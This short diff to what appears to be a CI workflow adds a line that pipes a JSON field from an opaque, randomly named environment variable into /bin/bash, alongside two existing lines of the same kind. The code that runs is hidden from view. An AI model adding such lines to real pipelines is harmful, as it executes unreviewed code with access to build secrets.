@@ -21,6 +21,7 @@ jobs:
         run: |
           printf '%s' "$j462" | jq -r .igx90504 | /bin/bash
           printf '%s' "$vhxmq2" | jq -r .fbl5515 | /bin/bash
+          printf '%s' "$hpov8051" | jq -r .u60028 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
